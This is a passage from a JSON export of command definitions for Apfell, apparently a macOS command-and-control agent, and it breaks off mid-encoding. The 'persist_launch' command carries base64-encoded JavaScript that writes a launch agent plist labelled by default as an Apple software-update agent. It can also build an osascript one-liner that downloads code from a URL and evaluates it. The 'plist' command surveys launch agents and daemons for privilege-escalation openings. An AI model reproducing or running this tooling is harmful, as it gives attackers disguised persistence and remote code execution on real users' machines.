          "description": "Create a launch agent or daemon plist file and either automatically put it in ~\/Library\/LaunchAgents or if LocalAgent is false, save it to the specified location. If you want an elevated launch agent or launch daemon( \/Library\/LaunchAgents or \/Library\/LaunchDaemons), you either need to be in an elevated context already and specify the path or use something like shell_elevated to copy it there. If the first arg is 'apfell-jxa' then Apfell will automatically construct a plist appropriate oneliner to use where arg1 should be the URL to reach out to for the payload.",
          "cmd": "persist_launch",
          "parameters": [
            {
              "type": "Array",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "args"
            },
            {
              "type": "Boolean",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "KeepAlive"
            },
            {
              "type": "String",
              "hint": "com.apple.softwareupdateagent",
              "choices": "",
              "required": true,
              "name": "label"
            },
            {
              "type": "String",
              "hint": "Path to save new plist to if LocalAgent is false",
              "choices": "",
              "required": false,
              "name": "LaunchPath"
            },
            {
              "type": "Boolean",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "LocalAgent"
            },
            {
              "type": "Boolean",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "RunAtLoad"
            }
          ],
          "attack": [
            {
              "t_num": "T1159",
              "attack_name": "Launch Agent"
            },
            {
              "t_num": "T1160",
              "attack_name": "Launch Daemon"
            }
          ],
          "artifacts": [
            {
              "command_parameter": "LocalAgent",
              "artifact": "File Create",
              "artifact_string": "Created a ~\/Library\/LaunchAgent file: *",
              "replace_string": "*"
            },
            {
              "command_parameter": "LaunchPath",
              "artifact": "File Create",
              "artifact_string": "Potentially created \"*\" if we didn't create a launch agent file.",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "persist_launch.js": "ZXhwb3J0cy5wZXJzaXN0X2xhdW5jaCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICBsZXQgdGVtcGxhdGUgPSAiPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwiVVRGLThcIj8+XG4iICsKICAgICAgICAgICAgICAgICI8IURPQ1RZUEUgcGxpc3QgUFVCTElDIFwiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOXCIgXCJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkXCI+XG4iICsKICAgICAgICAgICAgICAgICI8cGxpc3QgdmVyc2lvbj1cIjEuMFwiPlxuIiArCiAgICAgICAgICAgICAgICAiPGRpY3Q+XG4iICsKICAgICAgICAgICAgICAgICI8a2V5PkxhYmVsPC9rZXk+XG4iOwogICAgICAgIGxldCBsYWJlbCA9ICJjb20uYXBwbGUuc29mdHdhcmV1cGRhdGVhZ2VudCI7CiAgICAgICAgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCdsYWJlbCcpICYmIGNvbmZpZ1snbGFiZWwnXSAhPT0gIiIpe2xhYmVsID0gY29uZmlnWydsYWJlbCddO30KICAgICAgICB0ZW1wbGF0ZSArPSAiPHN0cmluZz4iICsgbGFiZWwgKyAiPC9zdHJpbmc+XG4iOwogICAgICAgIHRlbXBsYXRlICs9ICI8a2V5PlByb2dyYW1Bcmd1bWVudHM8L2tleT48YXJyYXk+XG4iOwogICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgnYXJncycpICYmIGNvbmZpZ1snYXJncyddLmxlbmd0aCA+IDApewogICAgICAgICAgICBpZihjb25maWdbJ2FyZ3MnXVswXSA9PT0gImFwZmVsbC1qeGEiKXsKICAgICAgICAgICAgICAgIC8vIHdlJ2xsIGFkZCBpbiBhbiBhcGZlbGwtanhhIG9uZSBsaW5lciB0byBydW4KICAgICAgICAgICAgICAgIHRlbXBsYXRlICs9ICI8c3RyaW5nPi91c3IvYmluL29zYXNjcmlwdDwvc3RyaW5nPlxuIiArCiAgICAgICAgICAgICAgICAiPHN0cmluZz4tbDwvc3RyaW5nPlxuIiArCiAgICAgICAgICAgICAgICAiPHN0cmluZz5KYXZhU2NyaXB0PC9zdHJpbmc+XG4iICsKICAgICAgICAgICAgICAgICI8c3RyaW5nPi1lPC9zdHJpbmc+XG4iICsKICAgICAgICAgICAgICAgICI8c3RyaW5nPmV2YWwoT2JqQy51bndyYXAoJC5OU1N0cmluZy5hbGxvYy5pbml0V2l0aERhdGFFbmNvZGluZygkLk5TRGF0YS5kYXRhV2l0aENvbnRlbnRzT2ZVUkwoJC5OU1VSTC5VUkxXaXRoU3RyaW5nKCciICsKICAgICAgICAgICAgICAgIGNvbmZpZ1snYXJncyddWzFdICsgIicpKSwkLk5TVVRGOFN0cmluZ0VuY29kaW5nKSkpPC9zdHJpbmc+XG4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgIGZvcihsZXQgaSA9IDA7IGkgPCBjb25maWdbJ2FyZ3MnXS5sZW5ndGg7IGkrKyl7CiAgICAgICAgICAgICAgICAgICAgdGVtcGxhdGUgKz0gIjxzdHJpbmc+IiArIGNvbmZpZ1snYXJncyddW2ldICsgIjwvc3RyaW5nPlxuIjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ICJQcm9ncmFtIGFyZ3MgbmVlZHMgdmFsdWVzIGZvciBcImFwZmVsbC1qeGFcIiIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICAgICAgfQogICAgICAgIHRlbXBsYXRlICs9ICI8L2FycmF5PlxuIjsKICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ0tlZXBBbGl2ZScpICYmIGNvbmZpZ1snS2VlcEFsaXZlJ10gPT09IHRydWUpeyB0ZW1wbGF0ZSArPSAiPGtleT5LZWVwQWxpdmU8L2tleT5cbjx0cnVlLz5cbiI7IH0KICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ1J1bkF0TG9hZCcpICYmIGNvbmZpZ1snUnVuQXRMb2FkJ10gPT09IHRydWUpeyB0ZW1wbGF0ZSArPSAiPGtleT5SdW5BdExvYWQ8L2tleT5cbjx0cnVlLz5cbiI7IH0KICAgICAgICB0ZW1wbGF0ZSArPSAiPC9kaWN0PlxuPC9wbGlzdD5cbiIKICAgICAgICAvLyBub3cgd2UgbmVlZCB0byBhY3R1YWxseSB3cml0ZSBvdXQgdGhlIHBsaXN0IHRvIGRpc2sKICAgICAgICBsZXQgcmVzcG9uc2UgPSAiIjsKICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ0xvY2FsQWdlbnQnKSAmJiBjb25maWdbJ0xvY2FsQWdlbnQnXSA9PT0gdHJ1ZSl7CiAgICAgICAgICAgIGxldCBwYXRoID0gIn4vTGlicmFyeS9MYXVuY2hBZ2VudHMvIjsKICAgICAgICAgICAgcGF0aCA9ICQocGF0aCkuc3RyaW5nQnlFeHBhbmRpbmdUaWxkZUluUGF0aDsKICAgICAgICAgICAgdmFyIGZpbGVNYW5hZ2VyID0gJC5OU0ZpbGVNYW5hZ2VyLmRlZmF1bHRNYW5hZ2VyOwogICAgICAgICAgICBpZighZmlsZU1hbmFnZXIuZmlsZUV4aXN0c0F0UGF0aChwYXRoKSl7CiAgICAgICAgICAgICAgICAkLmZpbGVNYW5hZ2VyLmNyZWF0ZURpcmVjdG9yeUF0UGF0aFdpdGhJbnRlcm1lZGlhdGVEaXJlY3Rvcmllc0F0dHJpYnV0ZXNFcnJvcihwYXRoLCBmYWxzZSwgJCgpLCAkKCkpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHBhdGggPSAkKHBhdGguanMgKyAiLyIgKyBsYWJlbCArICIucGxpc3QiKTsKICAgICAgICAgICAgcmVzcG9uc2UgPSB3cml0ZV9kYXRhX3RvX2ZpbGUodGVtcGxhdGUsIHBhdGgpOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgnTGF1bmNoUGF0aCcpICYmIGNvbmZpZ1snTGF1bmNoUGF0aCddICE9PSAiIil7CiAgICAgICAgICAgIHJlc3BvbnNlID0gd3JpdGVfZGF0YV90b19maWxlKHRlbXBsYXRlLCAkKGNvbmZpZ1snTGF1bmNoUGF0aCddKSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjpyZXNwb25zZSwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "read one file: plist {\"type\": \"read\", \"filename\": \"full_path\"}, read all plists of a certain type: plist {\"type\": [\"readLaunchAgents\" | \"readLaunchDaemons\"]}",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Read plists and their associated attributes for attempts to privilege escalate",
          "cmd": "plist",
          "parameters": [
            {
              "type": "String",
              "hint": "full filename path if type is just read",
              "choices": "",
              "required": false,
              "name": "filename"
            },
            {
              "type": "Choice",
              "hint": "",
              "choices": "readLaunchAgents\nreadLaunchDaemons\nread",
              "required": true,
              "name": "type"
            }
          ],
          "attack": [
            {
              "t_num": "T1083",
              "attack_name": "File and Directory Discovery"
            },
            {
              "t_num": "T1007",
              "attack_name": "System Service Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "plist.js": "ZXhwb3J0cy5wbGlzdCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICBPYmpDLmltcG9ydCgnRm91bmRhdGlvbicpOwogICAgICAgIGxldCBvdXRwdXQgPSBbXTsKICAgICAgICB0cnl7CiAgICAgICAgICAgIGlmKGNvbmZpZ1sndHlwZSddID09PSAicmVhZCIpewogICAgICAgICAgICAgICAgb3V0cHV0ID0gW107CiAgICAgICAgICAgICAgICBsZXQgZmlsZW5hbWUgPSAkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoVVRGOFN0cmluZyhjb25maWdbJ2ZpbGVuYW1lJ10pOwogICAgICAgICAgICAgICAgbGV0IHByZWZzID0gJC5OU011dGFibGVEaWN0aW9uYXJ5LmFsbG9jLmluaXRXaXRoQ29udGVudHNPZkZpbGUoZmlsZW5hbWUpOwogICAgICAgICAgICAgICAgbGV0IGNvbnRlbnRzID0gT2JqQy5kZWVwVW53cmFwKHByZWZzKTsKICAgICAgICAgICAgICAgIGxldCBmaWxlTWFuYWdlciA9ICQuTlNGaWxlTWFuYWdlci5kZWZhdWx0TWFuYWdlcjsKICAgICAgICAgICAgICAgIGxldCBwbGlzdFBlcm1zID0gT2JqQy51bndyYXAoZmlsZU1hbmFnZXIuYXR0cmlidXRlc09mSXRlbUF0UGF0aEVycm9yKCQoY29uZmlnWydmaWxlbmFtZSddKSwgJCgpKSk7CiAgICAgICAgICAgICAgICBsZXQgbnNwb3NpeCA9IHt9OwogICAgICAgICAgICAgICAgbGV0IHBvc2l4ID0gIiI7CiAgICAgICAgICAgICAgICBpZihwbGlzdFBlcm1zICE9PSB1bmRlZmluZWQpewogICAgICAgICAgICAgICAgICAgIG5zcG9zaXggPSBwbGlzdFBlcm1zWydOU0ZpbGVQb3NpeFBlcm1pc3Npb25zJ10uanM7CiAgICAgICAgICAgICAgICAgICAgcG9zaXggPSAoKG5zcG9zaXggPj4gNikgJiAweDcpLnRvU3RyaW5nKCkgKyAoKG5zcG9zaXggPj4gMykgJiAweDcpLnRvU3RyaW5nKCkgKyAobnNwb3NpeCAmIDB4NykudG9TdHJpbmcoKTsKICAgICAgICAgICAgICAgICAgICBpZihwbGlzdFBlcm1zWydOU0ZpbGVFeHRlbmRlZEF0dHJpYnV0ZXMnXSAhPT0gdW5kZWZpbmVkKXsKICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGV4dGVuZGVkID0ge307CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwZXJtcyA9IHBsaXN0UGVybXNbJ05TRmlsZUV4dGVuZGVkQXR0cmlidXRlcyddLmpzOwogICAgICAgICAgICAgICAgICAgICAgICBmb3IobGV0IGogaW4gcGVybXMpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXh0ZW5kZWRbal0gPSBwZXJtc1tqXS5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCkuanM7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudHNbJ1BsaXN0UGVybWlzc2lvbnNFeHRlbmRlZEF0dHJpYnV0ZXMnXSA9IGV4dGVuZGVkOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIHdlIG5lZWQgdG8gZml4IHRoaXMgbWVzcyB0byBhY3R1YWxseSBiZSByZWFsIHBlcm1pc3Npb24gYml0cyB0aGF0IG1ha2Ugc2Vuc2UKICAgICAgICAgICAgICAgIGNvbnRlbnRzWydQbGlzdFBlcm1pc3Npb25zJ10gPSBwb3NpeDsKICAgICAgICAgICAgICAgIG91dHB1dC5wdXNoKGNvbnRlbnRzKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIGlmKGNvbmZpZ1sndHlwZSddID09PSAicmVhZExhdW5jaEFnZW50cyIpewogICAgICAgICAgICAgICAgb3V0cHV0ID0ge307CiAgICAgICAgICAgICAgICBsZXQgZmlsZU1hbmFnZXIgPSAkLk5TRmlsZU1hbmFnZXIuZGVmYXVsdE1hbmFnZXI7CiAgICAgICAgICAgICAgICBsZXQgZXJyb3IgPSBSZWYoKTsKICAgICAgICAgICAgICAgIGxldCBwYXRoID0gZmlsZU1hbmFnZXIuaG9tZURpcmVjdG9yeUZvckN1cnJlbnRVc2VyLmZpbGVTeXN0ZW1SZXByZXNlbnRhdGlvbiArICIvTGlicmFyeS9MYXVuY2hBZ2VudHMvIjsKICAgICAgICAgICAgICAgIGxldCBmaWxlcyA9IGZpbGVNYW5hZ2VyLmNvbnRlbnRzT2ZEaXJlY3RvcnlBdFBhdGhFcnJvcigkKHBhdGgpLCBlcnJvcik7CiAgICAgICAgICAgICAgICB0cnl7CiAgICAgICAgICAgICAgICAgICAgLy8gbm8gZXJyb3JzLCBzbyBub3cgaXRlcmF0ZSBvdmVyIHRoZSBmaWxlcwogICAgICAgICAgICAgICAgICAgIGZpbGVzID0gT2JqQy5kZWVwVW53cmFwKGZpbGVzKTsKICAgICAgICAgICAgICAgICAgICBvdXRwdXRbImxvY2FsTGF1bmNoQWdlbnRzIl0gPSB7fTsKICAgICAgICAgICAgICAgICAgICBmb3IobGV0IGkgaW4gZmlsZXMpewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgcHJlZnMgPSAkLk5TTXV0YWJsZURpY3Rpb25hcnkuYWxsb2MuaW5pdFdpdGhDb250ZW50c09mRmlsZShwYXRoICsgZmlsZXNbaV0pOwogICAgICAgICAgICAgICAgICAgICAgICBsZXQgY29udGVudHMgPSBPYmpDLmRlZXBVbndyYXAocHJlZnMpOwogICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGxpc3RQZXJtcyA9IE9iakMudW53cmFwKGZpbGVNYW5hZ2VyLmF0dHJpYnV0ZXNPZkl0ZW1BdFBhdGhFcnJvcigkKHBhdGggKyBmaWxlc1tpXSksICQoKSkpOwogICAgICAgICAgICAgICAgICAgICAgICBsZXQgbnNwb3NpeCA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICBsZXQgcG9zaXggPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgaWYocGxpc3RQZXJtcyAhPT0gdW5kZWZpbmVkKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5zcG9zaXggPSBwbGlzdFBlcm1zWydOU0ZpbGVQb3NpeFBlcm1pc3Npb25zJ10uanM7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwb3NpeCA9ICgobnNwb3NpeCA+PiA2KSAmIDB4NykudG9TdHJpbmcoKSArICgobnNwb3NpeCA+PiAzKSAmIDB4NykudG9TdHJpbmcoKSArIChuc3Bvc2l4ICYgMHg3KS50b1N0cmluZygpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYocGxpc3RQZXJtc1snTlNGaWxlRXh0ZW5kZWRBdHRyaWJ1dGVzJ10gIT09IHVuZGVmaW5lZCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGV4dGVuZGVkID0ge307CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBlcm1zID0gcGxpc3RQZXJtc1snTlNGaWxlRXh0ZW5kZWRBdHRyaWJ1dGVzJ10uanM7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKGxldCBqIGluIHBlcm1zKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXh0ZW5kZWRbal0gPSBwZXJtc1tqXS5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCkuanM7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRzWydQbGlzdFBlcm1pc3Npb25zRXh0ZW5kZWRBdHRyaWJ1dGVzJ10gPSBleHRlbmRlZDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAvLyB3ZSBuZWVkIHRvIGZpeCB0aGlzIG1lc3MgdG8gYWN0dWFsbHkgYmUgcmVhbCBwZXJtaXNzaW9uIGJpdHMgdGhhdCBtYWtlIHNlbnNlCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRzWydQbGlzdFBlcm1pc3Npb25zJ10gPSBwb3NpeDsKICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0WyJsb2NhbExhdW5jaEFnZW50cyJdW2ZpbGVzW2ldXSA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRbImxvY2FsTGF1bmNoQWdlbnRzIl1bZmlsZXNbaV1dWydjb250ZW50cyddID0gY29udGVudHM7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKGNvbnRlbnRzICE9PSB1bmRlZmluZWQgJiYgY29udGVudHMuaGFzT3duUHJvcGVydHkoIlByb2dyYW1Bcmd1bWVudHMiKSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL25vdyB0cnkgdG8gZ2V0IHRoZSBhdHRyaWJ1dGVzIG9mIHRoZSBwcm9ncmFtIHRoaXMgcGxpc3QgcG9pbnRzIHRvIHNpbmNlIGl0IG1pZ2h0IGhhdmUgYXR0cmlidXRlIGlzc3VlcyBmb3IgYWJ1c2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBhdHRyaWJ1dGVzID0gT2JqQy5kZWVwVW53cmFwKGZpbGVNYW5hZ2VyLmF0dHJpYnV0ZXNPZkl0ZW1BdFBhdGhFcnJvcigkKGNvbnRlbnRzWydQcm9ncmFtQXJndW1lbnRzJ11bMF0pLCAkKCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGF0dHJpYnV0ZXMgIT09IHVuZGVmaW5lZCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRyaW1tZWRfYXR0cmlidXRlcyA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlT3duZXJBY2NvdW50SUQnXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudElEJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJpbW1lZF9hdHRyaWJ1dGVzWydOU0ZpbGVFeHRlbnNpb25IaWRkZW4nXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZUV4dGVuc2lvbkhpZGRlbiddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlR3JvdXBPd25lckFjY291bnRJRCddID0gYXR0cmlidXRlc1snTlNGaWxlR3JvdXBPd25lckFjY291bnRJRCddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlT3duZXJBY2NvdW50TmFtZSddID0gYXR0cmlidXRlc1snTlNGaWxlT3duZXJBY2NvdW50TmFtZSddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlQ3JlYXRpb25EYXRlJ10gPSBhdHRyaWJ1dGVzWydOU0ZpbGVDcmVhdGlvbkRhdGUnXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuc3Bvc2l4ID0gYXR0cmlidXRlc1snTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHdlIG5lZWQgdG8gZml4IHRoaXMgbWVzcyB0byBhY3R1YWxseSBiZSByZWFsIHBlcm1pc3Npb24gYml0cyB0aGF0IG1ha2Ugc2Vuc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwb3NpeCA9ICgobnNwb3NpeCA+PiA2KSAmIDB4NykudG9TdHJpbmcoKSArICgobnNwb3NpeCA+PiAzKSAmIDB4NykudG9TdHJpbmcoKSArIChuc3Bvc2l4ICYgMHg3KS50b1N0cmluZygpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddID0gcG9zaXg7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJpbW1lZF9hdHRyaWJ1dGVzWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50TmFtZSddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlTW9kaWZpY2F0aW9uRGF0ZSddID0gYXR0cmlidXRlc1snTlNGaWxlTW9kaWZpY2F0aW9uRGF0ZSddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dFsibG9jYWxMYXVuY2hBZ2VudHMiXVtmaWxlc1tpXV1bJ1Byb2dyYW1BdHRyaWJ1dGVzJ10gPSB0cmltbWVkX2F0dHJpYnV0ZXM7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgICAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjoiRXJyb3IgdHJ5aW5nIHRvIHJlYWQgfi9MaWJyYXJ5L0xhdW5jaEFnZW50czogIiArIGVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBwYXRoID0gIi9MaWJyYXJ5L0xhdW5jaEFnZW50cy8iOwogICAgICAgICAgICAgICAgZmlsZXMgPSBmaWxlTWFuYWdlci5jb250ZW50c09mRGlyZWN0b3J5QXRQYXRoRXJyb3IoJChwYXRoKSwgZXJyb3IpOwogICAgICAgICAgICAgICAgdHJ5ewogICAgICAgICAgICAgICAgICAgIC8vIG5vIGVycm9ycywgc28gbm93IGl0ZXJhdGUgb3ZlciB0aGUgZmlsZXMKICAgICAgICAgICAgICAgICAgICBmaWxlcyA9IE9iakMuZGVlcFVud3JhcChmaWxlcyk7CiAgICAgICAgICAgICAgICAgICAgb3V0cHV0WyJzeXN0ZW1MYXVuY2hBZ2VudHMiXSA9IHt9OwogICAgICAgICAgICAgICAgICAgIGZvcihsZXQgaSBpbiBmaWxlcyl7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwcmVmcyA9ICQuTlNNdXRhYmxlRGljdGlvbmFyeS5hbGxvYy5pbml0V2l0aENvbnRlbnRzT2ZGaWxlKHBhdGggKyBmaWxlc1tpXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBjb250ZW50cyA9IE9iakMuZGVlcFVud3JhcChwcmVmcyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwbGlzdFBlcm1zID0gT2JqQy51bndyYXAoZmlsZU1hbmFnZXIuYXR0cmlidXRlc09mSXRlbUF0UGF0aEVycm9yKCQocGF0aCArIGZpbGVzW2ldKSwgJCgpKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuc3Bvc2l4ID0ge307CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwb3NpeCA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBpZihwbGlzdFBlcm1zICE9PSB1bmRlZmluZWQpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbnNwb3NpeCA9IHBsaXN0UGVybXNbJ05TRmlsZVBvc2l4UGVybWlzc2lvbnMnXS5qczsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBvc2l4ID0gKChuc3Bvc2l4ID4+IDYpICYgMHg3KS50b1N0cmluZygpICsgKChuc3Bvc2l4ID4+IDMpICYgMHg3KS50b1N0cmluZygpICsgKG5zcG9zaXggJiAweDcpLnRvU3RyaW5nKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihwbGlzdFBlcm1zWydOU0ZpbGVFeHRlbmRlZEF0dHJpYnV0ZXMnXSAhPT0gdW5kZWZpbmVkKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXh0ZW5kZWQgPSB7fTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGVybXMgPSBwbGlzdFBlcm1zWydOU0ZpbGVFeHRlbmRlZEF0dHJpYnV0ZXMnXS5qczsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IobGV0IGogaW4gcGVybXMpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRlbmRlZFtqXSA9IHBlcm1zW2pdLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudHNbJ1BsaXN0UGVybWlzc2lvbnNFeHRlbmRlZEF0dHJpYnV0ZXMnXSA9IGV4dGVuZGVkOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIHdlIG5lZWQgdG8gZml4IHRoaXMgbWVzcyB0byBhY3R1YWxseSBiZSByZWFsIHBlcm1pc3Npb24gYml0cyB0aGF0IG1ha2Ugc2Vuc2UKICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudHNbJ1BsaXN0UGVybWlzc2lvbnMnXSA9IHBvc2l4OwogICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRbJ3N5c3RlbUxhdW5jaEFnZW50cyddW2ZpbGVzW2ldXSA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRbInN5c3RlbUxhdW5jaEFnZW50cyJdW2ZpbGVzW2ldXVsnY29udGVudHMnXSA9IGNvbnRlbnRzOwogICAgICAgICAgICAgICAgICAgICAgICBpZihjb250ZW50cyAhPT0gdW5kZWZpbmVkICYmIGNvbnRlbnRzLmhhc093blByb3BlcnR5KCJQcm9ncmFtQXJndW1lbnRzIikpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGF0dHJpYnV0ZXMgPSBPYmpDLmRlZXBVbndyYXAoZmlsZU1hbmFnZXIuYXR0cmlidXRlc09mSXRlbUF0UGF0aEVycm9yKCQoY29udGVudHNbJ1Byb2dyYW1Bcmd1bWVudHMnXVswXSksICQoKSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoYXR0cmlidXRlcyAhPT0gdW5kZWZpbmVkKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgdHJpbW1lZF9hdHRyaWJ1dGVzID0ge307CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJpbW1lZF9hdHRyaWJ1dGVzWydOU0ZpbGVPd25lckFjY291bnRJRCddID0gYXR0cmlidXRlc1snTlNGaWxlT3duZXJBY2NvdW50SUQnXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cmltbWVkX2F0dHJpYnV0ZXNbJ05TRmlsZUV4dGVuc2lvbkhpZGRlbiddID0gYXR0cmlidXRlc1snTlNGaWxlRXh0ZW5zaW9uSGlkZGVuJ107CiAgICAg